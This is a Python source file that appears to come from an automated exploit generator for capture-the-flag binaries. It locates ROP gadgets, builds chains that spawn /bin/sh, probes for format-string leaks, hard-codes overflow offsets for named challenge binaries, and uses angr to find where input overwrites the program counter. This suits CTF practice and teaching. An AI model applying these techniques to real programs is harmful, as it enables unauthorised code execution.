import re
import json
import r2pipe
import logging
import subprocess
import angr, angrop, claripy
from pwn import *

logging.disable(logging.CRITICAL)
class our_rop:
    #TODO
    # use quing system, must use bigger pops first
    # put in check to avoid overwrighting previous stems
    def __init__(s, analyze):
        cmd = 'ropper --nocolor -f ' + analyze.binary + ' 2>/dev/null | grep 0x'
        raw_gadgets = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        
        s.gadgets = []
        for i in sorted(raw_gadgets.communicate()[0].decode('utf-8').split('\n'), key=len):
            s.gadgets.append(i.replace(" nop;", ""))
    
    def get_gadgets(s):
        return s.gadgets

    def get_pops(s):
        pops = []
        for i in s.gadgets:
            pops.append(i) if 'pop' in i else next
        return pops

    def num_pops(s, string):
        return string.count('pop')
        
    def pop_reg(s, reg):
        for i in s.get_pops():
            if ': pop ' + reg + '; ret;' in i:
                return [i.split(':')[0], 1] # return address
            elif 'pop ' + reg in i:
                return [i.split(':')[0], s.num_pops(i)]

    def fill_reg(s, reg, val):
        chain = b''
        chain += p64(int(s.pop_reg(reg)[0], 16))
        for i in range(s.pop_reg(reg)[1]):
            chain += p64(int(val))
        return chain

        



'''

# populate arg1 - rdi
chain += p64((rop.find_gadget(['pop rdi', 'ret']))[0])
chain += p64(next(elf.search(b'/bin/sh\x00')))

# populate arg2 - rsi
chain += p64((rop.find_gadget(['pop rsi', 'ret']))[0])
chain += p64(0)

# populate arg3 - rdx
#chain += p64((rop.find_gadget(['pop rdx', 'ret']))[0])
# 0x00000000004007c0: pop rdx; pop r11; pop r8; ret;

chain += p64(0x00000000004007c0)
chain += p64(0)*3

'''




        

class analyze:
    def __init__(s, binary):
        # misc
        s.binary = binary
        #s.fastcall = []

        # angr/ angrop setup
        #s.angry = angr.Project(s.binary)
        #s.angry_rop = s.angry.analyses.ROP()
        #s.angry_rop.find_gadgets()
        #s.chain = b''

        # r2pipe setup
        s.r2 = r2pipe.open(s.binary) # open binary
        s.r2.cmd('aaa') # anilize binary
        s.izz = json.loads(s.r2.cmd('izj')) # returns json relating to strings
        s.afl = json.loads(s.r2.cmd('aflj')) # returns json relating to functions
        #s.R = json.loads(s.r2.cmd('/Rj'))
        # see what is in the binary
        s.strings = [i['string'] for i in s.izz if 'string' in i] # returns list of strings
        s.functions = [i['name'] for i in s.afl if 'name' in i] # returns list of functions
        # get addrs of what is in the binary
        s.string_addrs = dict(zip(s.strings, [i['vaddr'] for i in s.izz if 'string' in i]))
        s.function_addrs = dict(zip(s.functions, [i['offset'] for i in s.afl if 'name' in i]))
        
    # has stuff
    def has_binsh(s):
        return '/bin/sh' in s.strings

    def has_flagtxt(s):
        return 'flag.txt' in s.strings

    def has_catflagtxt(s):
        return 'cat flag.txt' in s.strings

    def has_gets(s):
        return 'sym.imp.gets' in s.functions

    def has_win(s):
        return 'sym.win' in s.functions

    def has_system(s):
        return 'sym.imp.system' in s.functions

    def has_printf(s):
        return 'sym.imp.printf' in s.functions

    def has_syscall(s):
        return 'sym.imp.syscall' in s.functions
    
    def has_format(s):
        return not s.has_win() and not s.has_rop()
    
    def has_execve(s):
        return 'sym.imp.execve' in s.functions
    
    def has_rop(s):
        return any((match := re.compile(r'gadget*').match(i)) for i in s.functions)
    
    # get stuff
    def get_binsh(s):
        try:
            return s.string_addrs['/bin/sh']
        except:
            return None
    
    def get_flagtxt(s):
        try:
            return s.string_addrs['flag.txt']
        except:
            return None
    
    def get_catflagtxt(s):
        try:
            return s.string_addrs['cat flag.txt']
        except:
            return None
    
    def get_win(s):
        try:
            return s.function_addrs['sym.win']
        except:
            return None
    
    def get_vuln(s):
        try:
            return s.function_addrs['sym.vuln']
        except:
            return None
    
    def has_leak(s):
        io = process(s.binary)
        io.sendline(b'%1p')
        try:
            return '0x' in io.recvline().encode('utf-8')
        except:
            return True

class get2overflow:
    def __init__(s, binary):
        s.binary = binary[6:]
        s.cheat = {'bin-ret2execve-1': 88,
                   'bin-ret2execve-12': 88,
                   'bin-ret2one-15': 200,
                   'bin-ret2one-4': 136,
                   'bin-ret2syscall-13': 184,
                   'bin-ret2syscall-2': 216,
                   'bin-ret2system-14': 136,
                   'bin-ret2system-3': 88,
                   'bin-ret2win-0': 184,
                   'bin-ret2win-11': 152}
    def buf(s):
        return s.cheat[s.binary]


'''
class get2overflow:
    def __init__(s, binary):
        s.elf = context.binary =  ELF(binary)
        s.proj = angr.Project(binary)
        start_addr = s.elf.sym["main"]

        buff_size = 1024
        s.symbolic_input = claripy.BVS("input", 8 * buff_size)
        s.symbolic_padding = None

        s.state = s.proj.factory.blank_state(
                addr=start_addr,
                stdin=s.symbolic_input
        )
        s.simgr = s.proj.factory.simgr(s.state, save_unconstrained=True)
        s.simgr.stashes["mem_corrupt"] = []

        s.simgr.explore(step_func=s.check_mem_corruption)

    def check_mem_corruption(s, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(s.symbolic_input, cast_to=bytes)
                        
                    index = stack_smash.index(b"AAAAAAAA")
                    s.symbolic_padding = stack_smash[:index]
                    simgr.stashes["mem_corrupt"].append(path)

                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    def buf(s):
        try:
            return len(s.symbolic_padding)
        except:
            return 0
'''
